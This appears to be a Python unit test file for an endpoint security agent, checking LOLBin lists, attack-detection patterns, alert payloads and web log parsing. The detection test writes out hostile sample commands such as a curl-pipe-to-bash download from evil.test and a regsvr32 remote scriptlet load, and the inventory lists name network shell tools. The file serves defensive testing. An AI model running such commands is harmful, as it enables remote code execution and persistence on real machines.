import os
import sys
import unittest


AGENT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if AGENT_DIR not in sys.path:
    sys.path.insert(0, AGENT_DIR)

from collectors.browser_activity import _browser_identity, _safe_history_url
from collectors.workload_activity import WorkloadActivityCollector
from core.sender import AlertSender
from detectors.lolbins import LINUX_LOLBINS, SUSPICIOUS_PATTERNS, WINDOWS_LOLBINS


class Sender:
    def __init__(self):
        self.events = []

    def enqueue(self, event):
        self.events.append(event)


class LolbinsWebDnsTests(unittest.TestCase):
    def test_required_lolbin_inventory_is_covered(self):
        windows = {
            'powershell.exe', 'cmd.exe', 'wmic.exe', 'rundll32.exe', 'regsvr32.exe',
            'mshta.exe', 'certutil.exe', 'bitsadmin.exe', 'cscript.exe', 'wscript.exe',
            'installutil.exe', 'msbuild.exe', 'reg.exe', 'net.exe', 'netsh.exe',
            'sc.exe', 'schtasks.exe', 'psexec.exe', 'explorer.exe', 'ftp.exe',
            'curl.exe', 'winget.exe', 'robocopy.exe', 'xcopy.exe', 'bcdedit.exe',
            'diskshadow.exe', 'forfiles.exe', 'odbcconf.exe', 'presentationhost.exe',
            'control.exe', 'mmc.exe', 'rasautou.exe', 'syncappvpublishingserver.exe',
        }
        linux = {
            'bash', 'sh', 'dash', 'zsh', 'curl', 'wget', 'scp', 'ssh', 'nc',
            'netcat', 'python', 'python3', 'perl', 'ruby', 'php', 'tar', 'find',
            'chmod', 'chown', 'crontab', 'systemctl', 'journalctl', 'screen', 'tmux',
            'socat', 'openssl', 'gpg', 'rsync', 'mount', 'umount', 'awk', 'sed',
            'tee', 'base64',
        }
        self.assertTrue(windows.issubset(WINDOWS_LOLBINS))
        self.assertTrue(linux.issubset(LINUX_LOLBINS))

    def test_detection_patterns_cover_key_abuse_without_generic_session_false_positive(self):
        cases = {
            'powershell.exe -EncodedCommand ZQB4AGEAbQBwAGwAZQ==': 'Encoded PowerShell command',
            'wmic /node:server process call create cmd.exe': 'WMIC process creation',
            'regsvr32 /s /n /i:https://evil.test/a.sct scrobj.dll': 'Regsvr32 remote scriptlet',
            'curl https://evil.test/a | bash': 'Download and execute pipe',
            'schtasks /create /tn updater /tr evil.exe': 'Scheduled task creation',
        }
        for command, expected in cases.items():
            matches = [label for pattern, label, _mitre, _severity in SUSPICIOUS_PATTERNS if pattern.search(command)]
            self.assertIn(expected, matches, command)
        benign = '/usr/bin/dbus-daemon --session --address=unix:path=/run/user/1000/bus'
        labels = [label for pattern, label, _mitre, _severity in SUSPICIOUS_PATTERNS if pattern.search(benign)]
        self.assertNotIn('Remote PowerShell execution', labels)

    def test_sender_preserves_forensic_and_web_dns_fields(self):
        sender = AlertSender.__new__(AlertSender)
        sender.config = {
            'agent_key': 'agent-secret', 'company_id': 'company', 'department_id': 'dept',
            'system_id': 'system', 'system_name': 'endpoint-01', 'agent_version': '1.2.3',
        }
        payload = sender._build_payload({
            'rule_id': 'LOLBIN_DETECTED', 'capabilityId': 28,
            'process_name': 'powershell.exe', 'process_end_time': '2026-08-30T10:00:00Z',
            'process_exit_code': 1, 'integrity_level': 'High', 'company': 'Microsoft',
            'version': '10.0', 'executable_md5': 'a' * 32, 'user_domain': 'CORP',
            'url': 'https://example.test/download', 'http_method': 'GET',
            'response_time': 42, 'request_size': 10, 'response_size': 20,
            'browser': 'Edge', 'user_agent': 'test-agent', 'resolver': '10.0.0.53',
            'query_time': 7,
        })
        self.assertEqual(payload['process_end_time'], '2026-08-30T10:00:00Z')
        self.assertEqual(payload['process_exit_code'], 1)
        self.assertEqual(payload['process_file_company'], 'Microsoft')
        self.assertEqual(payload['user_domain'], 'CORP')
        self.assertEqual(payload['httpMethod'], 'GET')
        self.assertEqual(payload['resolver'], '10.0.0.53')

    def test_browser_url_is_privacy_safe_and_browser_is_identified(self):
        safe = _safe_history_url('https://portal.example.test/login?token=secret#fragment')
        self.assertEqual(safe, 'https://portal.example.test/login')
        self.assertEqual(_browser_identity('/profiles/BraveSoftware/Brave-Browser/Default/History')[0], 'Brave')
        self.assertEqual(_browser_identity('/profiles/firefox/places.sqlite')[0], 'Firefox')

    def test_web_access_log_is_parsed_and_summarized(self):
        sender = Sender()
        collector = WorkloadActivityCollector(sender, config={'web_monitor_hostname': 'app.example.test'})
        line = '203.0.113.9 - - [30/Aug/2026:10:00:00 +0000] "GET /health HTTP/1.1" 200 123 "-" "Mozilla/5.0"'
        request = collector._parse_web_line('nginx', '/var/log/nginx/access.log', line)
        self.assertEqual(request['method'], 'GET')
        self.assertEqual(request['status'], '200')
        self.assertEqual(request['source_ip'], '203.0.113.9')
        collector._counts['nginx'] += 1
        collector._record_web_request('nginx', request)
        collector._emit_api_request('nginx', '/var/log/nginx/access.log', request)
        api_event = next(event for event in sender.events if event['rule_id'] == 'API_CALL_TELEMETRY')
        self.assertEqual(api_event['capabilityId'], 20)
        self.assertEqual(api_event['statusCode'], 200)
        self.assertEqual(api_event['requestPath'], '/health')
        collector._emit_summary()
        summary = next(event for event in sender.events if event['rule_id'] == 'WEB_TRAFFIC_SUMMARY')
        self.assertEqual(summary['capabilityId'], 9)
        self.assertEqual(summary['raw']['web_request_count'], 1)
        self.assertEqual(summary['raw']['http_methods'], {'GET': 1})


if __name__ == '__main__':
    unittest.main()
